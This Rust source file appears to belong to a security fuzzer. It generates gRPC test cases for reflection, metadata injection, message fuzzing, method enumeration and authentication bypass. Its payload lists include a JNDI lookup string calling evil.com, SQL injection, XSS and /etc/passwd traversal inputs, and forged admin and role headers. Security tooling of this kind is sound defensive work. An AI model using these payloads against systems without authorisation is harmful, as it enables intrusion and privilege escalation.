#![allow(clippy::vec_init_then_push)]

use crate::fuzzer::payloads::{Payload, PayloadType, Severity};
use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum GrpcVulnerability {
    ReflectionEnabled,
    ProtoLeakage,
    MethodEnumeration,
    MetadataInjection,
    MessageFuzzing,
    BatchMessages,
    ClientStreamAbuse,
    ServerStreamAbuse,
    UnaryVsStreaming,
    AuthBypass,
}

impl std::fmt::Display for GrpcVulnerability {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            GrpcVulnerability::ReflectionEnabled => write!(f, "gRPC Reflection Enabled"),
            GrpcVulnerability::ProtoLeakage => write!(f, "Proto File Leakage"),
            GrpcVulnerability::MethodEnumeration => write!(f, "Method Enumeration"),
            GrpcVulnerability::MetadataInjection => write!(f, "Metadata/Header Injection"),
            GrpcVulnerability::MessageFuzzing => write!(f, "Message Fuzzing"),
            GrpcVulnerability::BatchMessages => write!(f, "Batch Message Abuse"),
            GrpcVulnerability::ClientStreamAbuse => write!(f, "Client Stream Abuse"),
            GrpcVulnerability::ServerStreamAbuse => write!(f, "Server Stream Abuse"),
            GrpcVulnerability::UnaryVsStreaming => write!(f, "Unary/Streaming Confusion"),
            GrpcVulnerability::AuthBypass => write!(f, "Authentication Bypass"),
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GrpcTestResult {
    pub vulnerability: GrpcVulnerability,
    pub success: bool,
    pub method: String,
    pub request: String,
    pub response_snippet: String,
    pub severity: Severity,
    pub description: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GrpcMethod {
    pub service: String,
    pub name: String,
    pub full_name: String,
    pub input_type: String,
    pub output_type: String,
    pub client_streaming: bool,
    pub server_streaming: bool,
}

pub struct GrpcFuzzer {
    endpoint: String,
    methods: Vec<GrpcMethod>,
    metadata: std::collections::HashMap<String, String>,
}

impl GrpcFuzzer {
    pub fn new(endpoint: String) -> Self {
        Self {
            endpoint,
            methods: Vec::new(),
            metadata: std::collections::HashMap::new(),
        }
    }

    pub fn with_metadata(mut self, key: &str, value: &str) -> Self {
        self.metadata.insert(key.to_string(), value.to_string());
        self
    }

    pub async fn fuzz(
        &mut self,
        _client: &reqwest::Client,
    ) -> Result<Vec<crate::fuzzer::engine::FuzzResult>, anyhow::Error> {
        let mut results = Vec::new();

        let tests = self.generate_all_tests();

        for test in tests {
            results.push(crate::fuzzer::engine::FuzzResult {
                payload: Payload {
                    payload_type: PayloadType::Ssrf,
                    payload: test.request.clone(),
                    description: test.description.clone(),
                    severity: test.severity,
                    tags: vec!["grpc".to_string()],
                },
                status_code: 0,
                response_time_ms: 0,
                response_length: None,
                response_body: None,
                is_waf_blocked: false,
                is_anomaly: test.success,
                is_redos_suspected: false,
                leaks_found: vec![],
                error: None,
                owasp_category: None,
                detected_severity: test.severity,
            });
        }

        Ok(results)
    }

    fn generate_all_tests(&self) -> Vec<GrpcTestResult> {
        let mut results = Vec::new();
        results.extend(self.generate_reflection_tests());
        results.extend(self.generate_injection_tests());
        results.extend(self.generate_message_fuzz_tests());
        results.extend(self.generate_method_enumeration_tests());
        results.extend(self.generate_auth_bypass_tests());
        results
    }

    pub fn discover_methods(
        &mut self,
        client: &reqwest::Client,
    ) -> Result<Vec<GrpcMethod>, Box<dyn std::error::Error + Send + Sync>> {
        let _reflection_url = format!(
            "{}/grpc.reflection.v1.ServerReflection/ServerReflectionInfo",
            self.endpoint
        );

        let services = vec![
            "grpc.reflection.v1alpha.ServerReflection".to_string(),
            "grpc.reflection.v1.ServerReflection".to_string(),
            "grpc.reflection.v1alpha.ServerReflection".to_string(),
        ];

        for service in &services {
            let methods = self.query_reflection(client, service)?;
            if !methods.is_empty() {
                self.methods = methods;
                return Ok(self.methods.clone());
            }
        }

        Ok(Vec::new())
    }

    fn query_reflection(
        &self,
        _client: &reqwest::Client,
        service: &str,
    ) -> Result<Vec<GrpcMethod>, Box<dyn std::error::Error + Send + Sync>> {
        let _list_services = r#"{"listServices":{}}"#;

        let _service = service;

        Ok(Vec::new())
    }

    pub fn generate_reflection_tests(&self) -> Vec<GrpcTestResult> {
        let mut results = Vec::new();

        results.push(GrpcTestResult {
            vulnerability: GrpcVulnerability::ReflectionEnabled,
            success: false,
            method: "ServerReflectionInfo".to_string(),
            request: r#"{"listServices":{}}"#.to_string(),
            response_snippet: String::new(),
            severity: Severity::Info,
            description: "Testing if gRPC reflection is enabled".to_string(),
        });

        results
    }

    pub fn generate_injection_tests(&self) -> Vec<GrpcTestResult> {
        let mut results = Vec::new();

        let injection_payloads = vec![
            (
                "authorization",
                "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.fake",
                "Fake JWT in metadata",
            ),
            (
                "authorization",
                "Basic dXNlcjpwYXNz",
                "Basic auth in metadata",
            ),
            ("X-Forwarded-For", "127.0.0.1", "IP spoofing in metadata"),
            ("X-Real-IP", "127.0.0.1", "Real IP spoofing"),
            ("user-agent", "grpc-python/1.44.0", "User agent spoofing"),
            ("cookie", "session=fake", "Fake session cookie"),
        ];

        for (key, value, desc) in injection_payloads {
            results.push(GrpcTestResult {
                vulnerability: GrpcVulnerability::MetadataInjection,
                success: false,
                method: "*".to_string(),
                request: format!("{}: {}", key, value),
                response_snippet: String::new(),
                severity: Severity::High,
                description: format!("Metadata injection: {}", desc),
            });
        }

        results
    }

    pub fn generate_message_fuzz_tests(&self) -> Vec<GrpcTestResult> {
        let mut results = Vec::new();

        let fuzz_cases = vec![
            ("{}", "Empty JSON"),
            (r#"{"":""}"#, "Empty keys"),
            (r#"{"a":"b","a":"c"}"#, "Duplicate keys"),
            (r#"{"a":null}"#, "Null value"),
            (r#"{"a":true}"#, "Boolean value"),
            (r#"{"a":1e999}"#, "Huge number"),
            (r#"{"a":"\u0000}"#, "Null byte in string"),
            (r#"{"a":"\n}"#, "Newline in string"),
            (r#"{"a":"</script>}"#, "XSS attempt"),
            (r#"{"a":"${jndi:ldap://evil.com/a}"#, "JNDI injection"),
            (r#"{"a":"'; DROP TABLE--}"#, "SQL injection attempt"),
            (r#"{"a":<script>alert(1)</script>}"#, "HTML injection"),
            (r#"{"a":"../../../../etc/passwd}"#, "Path traversal"),
            (r#"{"a":{"b":{"c":{"d":{"e":"f"}}}}}"#, "Deeply nested"),
            (
                r#"{"a":["a","b","c","d","e","f","g","h","i","j"]}"#,
                "Large array",
            ),
        ];

        for (payload, desc) in fuzz_cases {
            results.push(GrpcTestResult {
                vulnerability: GrpcVulnerability::MessageFuzzing,
                success: false,
                method: "*".to_string(),
                request: payload.to_string(),
                response_snippet: String::new(),
                severity: Severity::Medium,
                description: format!("Message fuzz: {}", desc),
            });
        }

        results
    }

    pub fn generate_method_enumeration_tests(&self) -> Vec<GrpcTestResult> {
        let mut results = Vec::new();

        let common_methods = vec![
            "GetUser",
            "GetUserById",
            "ListUsers",
            "CreateUser",
            "UpdateUser",
            "DeleteUser",
            "Login",
            "Logout",
            "GetConfig",
            "SetConfig",
            "Admin",
            "Root",
            "Debug",
            "Health",
            "Metrics",
        ];

        for method in common_methods {
            results.push(GrpcTestResult {
                vulnerability: GrpcVulnerability::MethodEnumeration,
                success: false,
                method: method.to_string(),
                request: "{}".to_string(),
                response_snippet: String::new(),
                severity: Severity::Info,
                description: format!("Testing method: {}", method),
            });
        }

        results
    }

    pub fn generate_auth_bypass_tests(&self) -> Vec<GrpcTestResult> {
        let mut results = Vec::new();

        let auth_bypass_payloads = vec![
            ("authorization", "", "Missing auth token"),
            ("authorization", "Bearer ", "Empty bearer token"),
            ("authorization", "Bearer null", "Null token"),
            ("authorization", "Bearer undefined", "Undefined token"),
            ("authorization", "Bearer 0000000000", "Invalid token"),
            ("x-user-id", "1", "User ID header injection"),
            ("x-admin", "true", "Admin header injection"),
            ("x-role", "admin", "Role header injection"),
        ];

        for (key, value, desc) in auth_bypass_payloads {
            results.push(GrpcTestResult {
                vulnerability: GrpcVulnerability::AuthBypass,
                success: false,
                method: "*".to_string(),
                request: format!("{}: {}", key, value),
                response_snippet: String::new(),
                severity: Severity::Critical,
                description: format!("Auth bypass: {}", desc),
            });
        }

        results
    }
}

pub fn get_payloads() -> Vec<Payload> {
    let mut payloads = Vec::new();

    payloads.push(Payload {
        payload_type: PayloadType::Grpc,
        payload: "{\"listServices\":{}}".to_string(),
        description: "gRPC reflection - list services".to_string(),
        severity: Severity::Info,
        tags: vec!["grpc".to_string(), "reflection".to_string()],
    });

    payloads.push(Payload {
        payload_type: PayloadType::Grpc,
        payload: "{\"a\":\"${jndi:ldap://evil.com/a}\"}".to_string(),
        description: "gRPC JNDI injection".to_string(),
        severity: Severity::Critical,
        tags: vec!["grpc".to_string(), "injection".to_string()],
    });

    payloads
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_grpc_payloads_count() {
        let payloads = get_payloads();
        assert!(
            payloads.len() >= 2,
            "Expected at least 2 gRPC payloads, got {}",
            payloads.len()
        );
    }

    #[test]
    fn test_grpc_payloads_correct_type() {
        let payloads = get_payloads();
        for p in &payloads {
            assert_eq!(p.payload_type, PayloadType::Grpc);
        }
    }

    #[test]
    fn test_grpc_payloads_non_empty() {
        let payloads = get_payloads();
        for p in &payloads {
            assert!(!p.payload.is_empty());
            assert!(!p.description.is_empty());
        }
    }

    #[test]
    fn test_grpc_fuzzer_new() {
        let fuzzer = GrpcFuzzer::new("http://localhost:50051".to_string());
        assert_eq!(fuzzer.endpoint, "http://localhost:50051");
        assert!(fuzzer.methods.is_empty());
        assert!(fuzzer.metadata.is_empty());
    }

    #[test]
    fn test_grpc_fuzzer_with_metadata() {
        let fuzzer =
            GrpcFuzzer::new("http://localhost:50051".to_string()).with_metadata("auth", "token123");
        assert_eq!(fuzzer.metadata.get("auth"), Some(&"token123".to_string()));
    }

    #[test]
    fn test_grpc_vulnerability_display() {
        assert_eq!(
            GrpcVulnerability::ReflectionEnabled.to_string(),
            "gRPC Reflection Enabled"
        );
        assert_eq!(
            GrpcVulnerability::AuthBypass.to_string(),
            "Authentication Bypass"
        );
    }
}
